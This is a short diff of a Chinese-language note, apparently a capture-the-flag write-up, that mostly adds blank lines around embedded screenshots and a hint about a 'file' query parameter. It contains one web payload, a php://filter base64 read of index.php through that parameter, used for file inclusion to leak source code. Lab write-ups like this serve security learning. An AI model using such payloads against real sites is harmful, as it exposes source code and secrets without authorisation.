@@ -2,10 +2,13 @@
 
 ---
 首页长这样
+
 ![[Pasted image 20230103082624.png|1000]]
 
 ![[Pasted image 20230103085349.png]]
+
 提示传递`file`查询
+
 ```php
 /index.php?file=php://filter/read=convert.base64-encode/resource=index.php
 ```
